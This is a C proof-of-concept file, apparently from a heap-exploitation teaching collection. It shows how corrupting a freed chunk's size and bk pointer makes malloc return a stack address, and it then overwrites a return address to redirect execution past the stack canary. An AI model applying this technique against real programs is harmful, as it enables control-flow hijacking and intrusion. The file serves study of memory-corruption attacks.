#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

void jackpot(){ printf("heyo\n"); exit(0); }

int main() {
	setbuf(stdout, NULL);
	intptr_t stack_buffer[4] = {0};

	printf("allocating victim chunk\n");
	intptr_t* victim = malloc(0x410);
	intptr_t* p1 = malloc(0x410);

	printf("freeing chunk %p\n", victim);
	free(victim);

	printf("create fake chunk on the stack");
	printf("set size for next allocation and the bk pointer to any writable address");
	stack_buffer[1] = 0x410 + 0x10;
	stack_buffer[3] = (intptr_t)stack_buffer;

	//xxxxxxxxxxxxxxVULNERABILITYxxxxxxxxxxxxxx
	printf("vulnerability (emulation): overwrite the [victim ==> size] and [victim ==> bk] pointer\n");
	victim[-1] = 0x30;
	victim[1] = (intptr_t)stack_buffer; // victim ==> bk is pointing to stack
	//xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

	char *p2 = malloc(0x410);
	printf("malloc(0x410): %p\n", p2);

	intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
	memcpy((p2+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

	assert((long)__builtin_return_address(0) == (long)jackpot);
}